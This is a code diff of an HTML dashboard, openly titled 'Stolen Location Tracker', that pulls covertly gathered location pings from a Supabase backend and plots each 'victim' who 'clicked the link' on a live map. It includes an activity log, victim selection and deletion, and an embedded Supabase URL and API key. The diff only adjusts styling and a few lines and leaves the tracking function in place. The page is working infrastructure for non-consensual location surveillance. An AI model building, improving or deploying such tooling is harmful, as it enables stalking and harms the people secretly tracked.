@@ -2,38 +2,38 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Stolen Location View</title>
+  <title>Stolen Location Dashboard</title>
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     body { margin:0; background:#111; color:#0f0; font-family:Arial; }
-    #map { height:60vh; width:100%; }
+    #map { height:65vh; width:100%; }
     .controls { padding:15px; background:#1a1a1a; text-align:center; }
-    select, button { padding:10px; margin:5px; font-size:16px; }
+    select, button { padding:12px; margin:5px; font-size:16px; }
     .delete-victim { background:#c00; color:white; font-weight:bold; }
-    .activity { padding:15px; background:#1a1a1a; max-height:220px; overflow-y:auto; }
-    .log { padding:10px; border-bottom:1px solid #333; background:#222; margin:5px 0; }
+    .activity { padding:15px; background:#1a1a1a; max-height:200px; overflow-y:auto; }
+    .log { padding:10px; margin:5px 0; background:#222; border-left:4px solid #0f0; }
   </style>
 </head>
 <body>
-  <h1>🔴 LIVE LOCATION TRACKING DASHBOARD</h1>
+  <h1>🔴 LIVE STOLEN LOCATION TRACKER</h1>
   
   <div class="controls">
     <strong>Select Victim: </strong>
     <select id="victimSelect" onchange="loadSelectedVictim()"></select>
-    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim</button>
+    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete Victim</button>
   </div>
 
   <div id="map"></div>
 
-  <h2 style="padding:10px; color:#0f0;">📢 Activity Log</h2>
+  <h2 style="padding:10px;">📢 Activity Log</h2>
   <div class="activity" id="activityLog"></div>
 
   <script>
     const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
     const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";
 
-    const map = L.map('map').setView([20.5937, 78.9629], 5);
+    const map = L.map('map').setView([20.5937, 78.9629], 6);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
     let currentVictimId = "";
@@ -47,7 +47,6 @@
       
       const select = document.getElementById('victimSelect');
       select.innerHTML = '<option value="">All Victims</option>';
-      
       victims.forEach(v => {
         const opt = document.createElement('option');
         opt.value = v.id;
@@ -68,7 +67,6 @@
       const res = await fetch(url, { headers: { "apikey": SUPABASE_KEY } });
       const data = await res.json();
 
-      // Clear old markers
       markers.forEach(m => map.removeLayer(m));
       markers = [];
 
@@ -77,56 +75,39 @@
       data.forEach(item => {
         if (item.lat && item.lon) {
           const marker = L.marker([item.lat, item.lon]).addTo(map);
-          marker.bindPopup(`Time: ${new Date(item.created_at).toLocaleString()}<br>Accuracy: ${item.accuracy}m`);
+          marker.bindPopup(`Time: ${new Date(item.created_at).toLocaleString()}`);
           markers.push(marker);
           bounds.push([item.lat, item.lon]);
         }
       });
 
-      // AUTO ZOOM to show all points nicely
       if (bounds.length > 0) {
-        map.fitBounds(bounds, { 
-          padding: [50, 50], 
-          maxZoom: 16 
-        });
-      } else if (currentVictimId) {
-        map.setView([20.5937, 78.9629], 5); // default if no data
+        map.fitBounds(bounds, { padding: [60, 60], maxZoom: 18 });
       }
     }
 
     async function loadActivityLog() {
-      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc&limit=10`, {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc&limit=12`, {
         headers: { "apikey": SUPABASE_KEY }
       });
       const sessions = await res.json();
-
       const logDiv = document.getElementById('activityLog');
       logDiv.innerHTML = "";
 
-      if (sessions.length === 0) {
-        logDiv.innerHTML = "<div class='log'>Waiting for victims to click the link...</div>";
-        return;
-      }
-
       sessions.forEach(s => {
-        const time = new Date(s.created_at).toLocaleString();
         const div = document.createElement('div');
         div.className = "log";
-        div.innerHTML = `✅ <strong>VICTIM CLICKED LINK</strong><br>${s.label} (${s.owner_id})<br><small>Tracking Started at ${time}</small>`;
+        div.innerHTML = `✅ <strong>VICTIM CLICKED</strong> - ${s.label} (${s.owner_id})<br><small>${new Date(s.created_at).toLocaleString()}</small>`;
         logDiv.appendChild(div);
       });
     }
 
     async function deleteCurrentVictim() {
-      if (!currentVictimId) return alert("Select a victim first");
-      if (!confirm("Delete this victim and ALL data?")) return;
+      if (!currentVictimId) return alert("Select victim first");
+      if (!confirm("Delete this victim completely?")) return;
 
-      await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}`, { 
-        method: "DELETE", headers: { "apikey": SUPABASE_KEY } 
-      });
-      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${currentVictimId}`, { 
-        method: "DELETE", headers: { "apikey": SUPABASE_KEY } 
-      });
+      await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
+      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${currentVictimId}`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
 
       alert("Victim deleted!");
       loadVictimsList();
@@ -135,15 +116,11 @@
       loadActivityLog();
     }
 
-    // Initial Load
+    // Auto refresh
     loadVictimsList();
     loadLiveData();
     loadActivityLog();
-
-    setInterval(() => {
-      loadLiveData();
-      loadActivityLog();
-    }, 5000);
+    setInterval(() => { loadLiveData(); loadActivityLog(); }, 5000);
   </script>
 </body>
 </html>
